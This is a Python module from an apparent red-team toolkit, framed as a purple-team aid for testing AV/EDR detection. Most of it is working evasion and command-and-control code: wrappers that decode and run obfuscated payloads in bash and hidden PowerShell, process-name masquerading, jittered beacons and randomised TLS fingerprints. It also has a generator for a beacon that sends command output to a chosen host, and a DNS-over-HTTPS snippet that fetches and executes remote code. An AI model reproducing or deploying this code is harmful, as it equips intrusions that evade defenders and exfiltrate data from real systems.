"""
FOR AUTHORIZED PURPLE TEAM OPERATIONS ONLY.

Provides payload obfuscation, traffic evasion primitives, beacon jitter,
and detection timing instrumentation to support authorized red team /
purple team engagements. Every capability is designed to be measured:
you send the payload, you record when (or whether) your detection stack fires.

Use ONLY against systems you have explicit written authorization to test.
All actions are audit()'d. DRY_RUN mode (TERMITE_SUMU_DRY_RUN=1) generates
artefacts but does not open network connections or write files to disk.
"""
from __future__ import annotations

import base64
import os
import random
import secrets
import ssl
import string
import time
from dataclasses import dataclass, field
from typing import Dict, Optional

from core.audit import audit
from core.validators import SecureInputValidator
from config.settings import LOGS_DIR, SENSITIVE_FILE_PERMS

DRY_RUN = os.environ.get("TERMITE_SUMU_DRY_RUN", "0") == "1"


# ---------------------------------------------------------------------------
# Configuration dataclass
# ---------------------------------------------------------------------------

@dataclass
class EvasionConfig:
    """All evasion settings in one place."""
    obfuscate_base64:       bool  = False
    obfuscate_xor:          bool  = False
    obfuscate_ps_encode:    bool  = False
    obfuscate_concat:       bool  = False
    randomize_varnames:     bool  = False
    http_beacon:            bool  = False
    http_beacon_host:       str   = ""
    http_beacon_port:       int   = 443
    http_beacon_path:       str   = "/api/v1/data"
    http_beacon_useragent:  str   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    jitter_enabled:         bool  = False
    jitter_min_s:           float = 5.0
    jitter_max_s:           float = 30.0
    tls_randomize_ciphers:  bool  = False
    process_masquerade:     bool  = False
    process_masquerade_name: str  = "kworker/u4:2"
    measure_detection:      bool  = False


# ---------------------------------------------------------------------------
# Payload obfuscation
# ---------------------------------------------------------------------------

class PayloadObfuscator:
    """
    Obfuscation pipeline for purple team AV/EDR evasion testing.

    Each method wraps a payload string and returns a new string that decodes
    and runs the original on the target. The obfuscated form is what AV/EDR
    static analysis sees — the test is whether your stack catches it anyway.
    """

    @staticmethod
    def base64_wrap_bash(payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        audit("EVASION_OBFUSCATE", detail="method=base64_bash")
        return f"echo {encoded}|base64 -d|bash"

    @staticmethod
    def base64_wrap_python(payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        audit("EVASION_OBFUSCATE", detail="method=base64_python")
        return (
            f"python3 -c 'import base64,os;"
            f"exec(base64.b64decode(\"{encoded}\").decode())'"
        )

    @staticmethod
    def xor_wrap_bash(payload: str, key: Optional[int] = None) -> str:
        """
        XOR-encode bash payload with a single-byte key, emit a self-decoding
        Python one-liner that pipes to bash.  Tests single-byte XOR detection.
        """
        if key is None:
            key = secrets.randbelow(254) + 1
        xored = bytes(b ^ key for b in payload.encode())
        b64   = base64.b64encode(xored).decode()
        audit("EVASION_OBFUSCATE", detail=f"method=xor_bash key=0x{key:02x}")
        return (
            f"python3 -c \""
            f"import base64;"
            f"d=base64.b64decode('{b64}');"
            f"print(bytes(b^{key} for b in d).decode())"
            f"\"|bash"
        )

    @staticmethod
    def powershell_encode(payload: str) -> str:
        """Encode PS payload as UTF-16LE base64 with -EncodedCommand flag."""
        encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
        audit("EVASION_OBFUSCATE", detail="method=ps_encodedcommand")
        return f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"

    @staticmethod
    def string_concat_obfuscate(payload: str, chunk_size: int = 8) -> str:
        """
        Split payload into concatenated variable chunks to break simple
        substring-match signatures.  Tests SIEM/AV substring matching.
        """
        if len(payload) <= chunk_size:
            return payload
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        parts  = []
        for i, chunk in enumerate(chunks):
            escaped = chunk.replace("'", "'\\''")
            parts.append(f"_v{i}='{escaped}'")
        varnames = "".join(f"${{_v{i}}}" for i in range(len(chunks)))
        audit("EVASION_OBFUSCATE", detail=f"method=concat chunks={len(chunks)}")
        return ";".join(parts) + f";eval \"{varnames}\""

    @staticmethod
    def randomize_ps_varnames(ps_script: str) -> str:
        """Replace common PS variable names with random ones to break name heuristics."""
        targets = ["$client","$stream","$buffer","$payload","$bytes","$data","$writer","$reader"]
        result  = ps_script
        for old in targets:
            result = result.replace(old, "$" + _rand_varname())
        audit("EVASION_OBFUSCATE", detail="method=ps_varname_rand")
        return result

    @classmethod
    def apply_config(cls, payload: str, cfg: EvasionConfig, os_type: str = "linux") -> str:
        """Run the full obfuscation pipeline as configured by EvasionConfig."""
        result = payload
        if cfg.randomize_varnames and os_type == "windows":
            result = cls.randomize_ps_varnames(result)
        if cfg.obfuscate_concat and os_type == "linux":
            result = cls.string_concat_obfuscate(result)
        if cfg.obfuscate_xor and os_type == "linux":
            result = cls.xor_wrap_bash(result)
        elif cfg.obfuscate_base64:
            if os_type == "linux":
                result = cls.base64_wrap_bash(result)
            else:
                result = cls.powershell_encode(result)
        if cfg.obfuscate_ps_encode and os_type == "windows":
            result = cls.powershell_encode(result)
        return result


# ---------------------------------------------------------------------------
# Process masquerade hint generator
# ---------------------------------------------------------------------------

class ProcessMasqueradeHint:
    """
    Generate process-rename snippets for purple team testing.
    Tests whether your EDR tracks process name at runtime vs only at creation.
    """

    @staticmethod
    def bash_snippet(name: str = "kworker/u4:2") -> str:
        safe = name.replace("'", "").replace('"', "")[:15]
        audit("EVASION_PROC_MASQ", detail=f"name={safe} os=linux method=exec_a")
        return f"exec -a '{safe}' bash -c "

    @staticmethod
    def python_snippet(name: str = "kworker/u4:2") -> str:
        safe = name.replace("'", "").replace('"', "")[:15]
        audit("EVASION_PROC_MASQ", detail=f"name={safe} os=linux method=prctl")
        return (
            f"import ctypes;"
            f"libc=ctypes.CDLL(None);"
            f"libc.prctl(15,b'{safe}',0,0,0);"
        )


# ---------------------------------------------------------------------------
# Beacon jitter engine
# ---------------------------------------------------------------------------

class JitterEngine:
    """
    Randomized beacon check-in intervals.
    Tests whether your behavioral detection identifies periodic C2 beaconing
    even with timing variation applied.
    """

    def __init__(self, min_s: float = 5.0, max_s: float = 30.0):
        if min_s < 0 or max_s < min_s:
            raise ValueError(f"Invalid jitter range: {min_s}..{max_s}")
        self._min = min_s
        self._max = max_s

    def next_delay(self) -> float:
        return random.uniform(self._min, self._max)

    def sleep(self) -> float:
        delay = self.next_delay()
        audit("EVASION_JITTER", detail=f"sleep={delay:.2f}s range={self._min}-{self._max}")
        time.sleep(delay)
        return delay

    @classmethod
    def from_config(cls, cfg: EvasionConfig) -> "JitterEngine":
        return cls(min_s=cfg.jitter_min_s, max_s=cfg.jitter_max_s)


# ---------------------------------------------------------------------------
# TLS evasion — cipher suite randomization
# ---------------------------------------------------------------------------

class TLSEvasionContext:
    """
    Build an ssl.SSLContext with randomized cipher suite ordering to vary
    the JA3 fingerprint per connection.
    Tests whether your network sensor catches C2 even with JA3 evasion.
    """

    _SAFE_CIPHERS = [
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "DHE-RSA-AES256-GCM-SHA384",
        "DHE-RSA-AES128-GCM-SHA256",
    ]

    @classmethod
    def build(
        cls,
        purpose: ssl.Purpose = ssl.Purpose.SERVER_AUTH,
        verify: bool = False,
        randomize: bool = True,
    ) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        else:
            ctx.verify_mode = ssl.CERT_REQUIRED
            ctx.load_default_certs(purpose)
        if randomize:
            shuffled = cls._SAFE_CIPHERS[:]
            random.shuffle(shuffled)
            try:
                ctx.set_ciphers(":".join(shuffled))
            except ssl.SSLError:
                pass
        audit("EVASION_TLS", detail=f"randomize={randomize} verify={verify}")
        return ctx


# ---------------------------------------------------------------------------
# HTTP beacon wrapper
# ---------------------------------------------------------------------------

class HTTPBeaconWrapper:
    """
    Disguise C2 communication as legitimate HTTP POST traffic.
    Tests whether your proxy/NGFW/SIEM detects C2 beacons based on
    HTTP content inspection vs only IP/port reputation.
    """

    _USERAGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.2478.97 Safari/537.36",
    ]

    _PATHS = [
        "/api/v1/telemetry",
        "/api/v2/events",
        "/collect",
        "/analytics/v3/collect",
        "/beacon/1/t",
        "/v1/logs",
    ]

    def __init__(self, cfg: EvasionConfig):
        self._host = SecureInputValidator.validate_host(cfg.http_beacon_host) if cfg.http_beacon_host else "localhost"
        self._port = SecureInputValidator.validate_port(cfg.http_beacon_port)
        self._path = cfg.http_beacon_path or random.choice(self._PATHS)
        self._ua   = cfg.http_beacon_useragent or random.choice(self._USERAGENTS)

    def build_request(self, data: bytes) -> bytes:
        """Build a raw HTTP/1.1 POST with data embedded as base64 JSON body."""
        b64_body = base64.b64encode(data).decode()
        body     = f'{{"d":"{b64_body}","ts":{int(time.time())}}}'.encode()
        headers  = (
            f"POST {self._path} HTTP/1.1\r\n"
            f"Host: {self._host}:{self._port}\r\n"
            f"User-Agent: {self._ua}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()
        audit("EVASION_HTTP_BEACON", detail=f"host={self._host} path={self._path}")
        return headers + body

    def generate_payload_snippet(self, lhost: str, lport: int) -> str:
        """Generate a Python snippet that beacons back over HTTP POST."""
        lhost = SecureInputValidator.validate_host(lhost)
        lport = SecureInputValidator.validate_port(lport)
        ua    = self._ua.replace("'", "\\'")
        path  = self._path
        audit("EVASION_HTTP_BEACON_SNIPPET", detail=f"lhost={lhost} lport={lport}")
        return (
            f"import socket,base64,time,random,subprocess\n"
            f"_h='{lhost}';_p={lport};_pa='{path}';_ua='{ua}'\n"
            f"while True:\n"
            f"  try:\n"
            f"    s=socket.create_connection((_h,_p),timeout=10)\n"
            f"    out=subprocess.check_output(['id'],stderr=subprocess.DEVNULL)\n"
            f"    body=base64.b64encode(out).decode()\n"
            f"    req=('POST '+_pa+' HTTP/1.1\\r\\nHost: '+_h+'\\r\\nUser-Agent: '"
            f"+_ua+'\\r\\nContent-Length: '+str(len(body))+'\\r\\n\\r\\n'+body).encode()\n"
            f"    s.sendall(req);s.close()\n"
            f"  except Exception:pass\n"
            f"  time.sleep(random.uniform(5,30))\n"
        )


# ---------------------------------------------------------------------------
# Detection timing instrumentation
# ---------------------------------------------------------------------------

@dataclass
class DetectionEvent:
    label:       str
    sent_at:     float
    detected_at: float = 0.0
    alert_detail: str  = ""

    @property
    def latency_ms(self) -> Optional[float]:
        return (self.detected_at - self.sent_at) * 1000 if self.detected_at > 0 else None

    @property
    def detected(self) -> bool:
        return self.detected_at > 0


class DetectionTimer:
    """
    Measure detection latency for purple team engagements.

    Workflow:
        timer = DetectionTimer()
        ev = timer.record_send("bash_b64")
        # send the payload to target
        # wait for EDR/SIEM alert
        timer.mark_detected(ev.label, alert_detail="CrowdStrike: ProcessInject")
        print(timer.report())
    """

    def __init__(self):
        self._events: Dict[str, DetectionEvent] = {}

    def record_send(self, label: str) -> DetectionEvent:
        ev = DetectionEvent(label=label, sent_at=time.monotonic())
        self._events[label] = ev
        audit("EVASION_TIMER_SEND", detail=f"label={label}")
        return ev

    def mark_detected(self, label: str, alert_detail: str = "") -> Optional[DetectionEvent]:
        ev = self._events.get(label)
        if ev:
            ev.detected_at  = time.monotonic()
            ev.alert_detail = alert_detail
            audit("EVASION_TIMER_DETECTED",
                  detail=f"label={label} latency_ms={ev.latency_ms:.0f} detail={alert_detail}")
        return ev

    def mark_missed(self, label: str) -> None:
        audit("EVASION_TIMER_MISSED", detail=f"label={label} DETECTION_GAP")

    def report(self) -> str:
        lines = [f"{'Label':<40} {'Detected':<10} {'Latency (ms)':<16} {'Alert'}"]
        lines.append("─" * 90)
        for ev in self._events.values():
            lat = f"{ev.latency_ms:.0f}" if ev.latency_ms is not None else "—"
            det = "YES" if ev.detected else "NO  ← GAP"
            lines.append(f"{ev.label:<40} {det:<10} {lat:<16} {ev.alert_detail}")
        detected = sum(1 for e in self._events.values() if e.detected)
        total    = len(self._events)
        lines.append("─" * 90)
        lines.append(f"Detection rate: {detected}/{total} ({100*detected//total if total else 0}%)")
        return "\n".join(lines)

    def export_json(self) -> str:
        import json, datetime
        ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOGS_DIR, f"detection_timing_{ts}.json")
        data = [
            {"label": e.label, "detected": e.detected,
             "latency_ms": e.latency_ms, "alert_detail": e.alert_detail}
            for e in self._events.values()
        ]
        if not DRY_RUN:
            fd = os.open(path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, SENSITIVE_FILE_PERMS)
            try:
                os.write(fd, json.dumps(data, indent=2).encode())
            finally:
                os.close(fd)
        audit("EVASION_TIMER_EXPORT", detail=f"path={path} events={len(data)}")
        return path


# ---------------------------------------------------------------------------
# DNS-over-HTTPS stub (interface only — no live DNS queries)
# ---------------------------------------------------------------------------

class DoHStub:
    """
    DNS-over-HTTPS C2 channel interface stub.

    INTERFACE ONLY — no live DNS queries are made here. Generates the Python
    snippet that implements DoH-based C2 on the target so you can test
    whether your DNS monitoring catches DoH-tunnelled lookups.
    """

    def __init__(self, resolver_url: str = "https://cloudflare-dns.com/dns-query"):
        if not resolver_url.startswith("https://"):
            raise ValueError("DoH resolver must use HTTPS")
        self._resolver = resolver_url

    def generate_lookup_snippet(self, c2_domain: str) -> str:
        c2_domain = SecureInputValidator.validate_domain(c2_domain)
        audit("EVASION_DOH_SNIPPET", detail=f"domain={c2_domain}")
        return (
            f"# DoH C2 lookup — purple team detection test\n"
            f"import urllib.request, json, base64\n"
            f"_doh='{self._resolver}';_dom='{c2_domain}'\n"
            f"req=urllib.request.Request(\n"
            f"    f'{{_doh}}?name={{_dom}}&type=TXT',\n"
            f"    headers={{'Accept':'application/dns-json'}})\n"
            f"resp=urllib.request.urlopen(req,timeout=5)\n"
            f"data=json.load(resp)\n"
            f"for ans in data.get('Answer',[]):\n"
            f"    exec(base64.b64decode(ans['data'].strip('\"')).decode())\n"
        )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _rand_varname(length: int = 6) -> str:
    chars = string.ascii_lowercase + string.digits
    return random.choice(string.ascii_lowercase) + "".join(
        random.choice(chars) for _ in range(length - 1)
    )


def apply_evasion_to_payload(payload: str, cfg: EvasionConfig, os_type: str = "linux") -> str:
    """Convenience: run the full evasion pipeline on a payload string."""
    result = PayloadObfuscator.apply_config(payload, cfg, os_type)
    if cfg.process_masquerade and os_type == "linux":
        if cfg.obfuscate_xor:
            # XOR output is `python3 -c "..."| bash` — already contains double quotes
            # so we cannot wrap it in bash_snippet's double-quoted arg without breaking the shell.
            # Skip masquerade; the XOR wrapper itself provides adequate obfuscation.
            pass
        elif "python" in payload.lower():
            result = ProcessMasqueradeHint.python_snippet(cfg.process_masquerade_name) + result
        else:
            result = ProcessMasqueradeHint.bash_snippet(cfg.process_masquerade_name) + f'"{result}"'
    return result
